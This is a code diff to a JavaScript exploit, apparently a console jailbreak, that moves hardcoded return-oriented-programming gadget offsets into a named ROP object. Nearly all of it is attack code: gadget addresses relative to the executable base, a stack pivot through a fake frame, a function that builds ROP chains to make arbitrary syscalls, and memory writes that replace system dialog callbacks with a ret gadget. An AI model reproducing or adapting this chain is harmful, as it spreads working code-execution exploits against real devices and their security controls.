@@ -36,7 +36,7 @@ let get_fwversion;
 
 // Global objects
 let allocated_buffers = [];
-let eboot_base;
+let eboot_base = 0n;
 let libc_base;
 let return_value_addr;
 let libkernel_base;
@@ -69,6 +69,23 @@ let SYSCALL = {
     getsockopt: 0x76n,
     sysctl: 0xcan,
     netgetiflist: 0x7dn,
+};
+
+let ROP = {
+    get pop_rsp()             { return eboot_base + 0x49f7fn;   },
+    get pop_rax()             { return eboot_base + 0x2d954n;   },
+    get pop_rdi()             { return eboot_base + 0xb0ec5n;   },
+    get pop_rsi()             { return eboot_base + 0xb8a81n;   },
+    get pop_rdx()             { return eboot_base + 0xb692n;    },
+    get pop_rcx()             { return eboot_base + 0x187da3n;  },
+    get pop_r8()              { return eboot_base + 0x1a8ff9n;  },
+    get pop_r9()              { return eboot_base + 0x1394e01n; },
+    get pop_rbp()             { return eboot_base + 0x69n;      },
+    get mov_qword_rdi_rax()   { return eboot_base + 0x49a77n;   },
+    get mov_qword_rdi_rdx()   { return eboot_base + 0x3a3b95n;  },
+    get mov_rax_0x200000000() { return eboot_base + 0x1283d40n; },
+    get mov_rsp_rbp()         { return eboot_base + 0xb1424n;   },
+    get ret()                 { return eboot_base + 0x32n;      },
 };
 
 async function checkLogServer() {
@@ -763,45 +780,45 @@ function trigger() {
 
         const fake_frame_addr = addrof(fake_frame);
         // Pivot RSP
-        write64(fake_frame_addr + 0x09n, eboot_base + 0x49f7fn); // pop rsp ; ret
+        write64(fake_frame_addr + 0x09n, ROP.pop_rsp); // pop rsp ; ret
         write64(fake_frame_addr + 0x11n, rop_chain_addr);
 
         call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
             
             // Syscall number
-            rop_chain[rop_i++] = eboot_base + 0x2d954n; // pop rax ; ret
+            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
             rop_chain[rop_i++] = rax;
             
             // Setup arguments
-            rop_chain[rop_i++] = eboot_base + 0xb0ec5n; // pop rdi ; ret
+            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
             rop_chain[rop_i++] = arg1;
-            rop_chain[rop_i++] = eboot_base + 0xb8a81n; // pop rsi ; ret
+            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
             rop_chain[rop_i++] = arg2;
-            rop_chain[rop_i++] = eboot_base + 0xb692n; // pop rdx ; ret
+            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
             rop_chain[rop_i++] = arg3;
-            rop_chain[rop_i++] = eboot_base + 0x187da3n; // pop rcx ; ret
+            rop_chain[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
             rop_chain[rop_i++] = arg4;
-            rop_chain[rop_i++] = eboot_base + 0x1a8ff9n; // pop r8 ; ret
+            rop_chain[rop_i++] = ROP.pop_r8; // pop r8 ; ret
             rop_chain[rop_i++] = arg5;
-            rop_chain[rop_i++] = eboot_base + 0x1394e01n; // pop r9 ; ret
+            rop_chain[rop_i++] = ROP.pop_r9; // pop r9 ; ret
             rop_chain[rop_i++] = arg6;
 
             // Call function
             rop_chain[rop_i++] = address; 
             
             // Store return value to return_value_addr
-            rop_chain[rop_i++] = eboot_base + 0xb0ec5n; // pop rdi ; ret
+            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
             rop_chain[rop_i++] = return_value_addr;
-            rop_chain[rop_i++] = eboot_base + 0x49a77n; // mov qword [rdi], rax ; ret
+            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
             
             // Return safe tagged value to JavaScript
-            rop_chain[rop_i++] = eboot_base + 0x1283d40n; // mov rax, 0x200000000 ; ret
+            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
 
-            rop_chain[rop_i++] = eboot_base + 0x69n; // pop rbp ; ret ;
+            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret ;
             rop_chain[rop_i++] = saved_fp;
             
-            rop_chain[rop_i++] = eboot_base + 0xb1424n; // mov rsp, rbp ; pop rbp ; ret
+            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
             
             return pwn(fake_frame);
         }
@@ -823,7 +840,7 @@ function trigger() {
             return return_value_buf[0];
         }
         
-        rop_test = call(eboot_base + 0x1283d40n);
+        rop_test = call(ROP.mov_rax_0x200000000);
         await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
         
         if (rop_test !== 0x200000000n) {
@@ -835,7 +852,6 @@ function trigger() {
         await log("Disabling PSN dialog and Youtube splash kill...");
         const psn_callback = eboot_base + 0x2AEC50n;
         const yt_callback = eboot_base + 0x10B70n;
-        const ret_gadget = eboot_base + 0x32n;
         
         await log("PSN dialog callback: " + toHex(psn_callback));
         await log("YT callback: " + toHex(yt_callback));
@@ -870,11 +886,11 @@ function trigger() {
                     if (value === psn_callback && psn_matches < 2) {
                         psn_matches++;
                         await log("PSN Callback address @ " + toHex(addr));
-                        write64(addr, ret_gadget);
+                        write64(addr, ROP.ret);
                     } else if (value === yt_callback && yt_matches < 1) {
                         yt_matches++;
                         await log("YT Callback address @ " + toHex(addr));
-                        write64(addr, ret_gadget);
+                        write64(addr, ROP.ret);
                     }
                     
                     // Break inner loop if we found everything we need
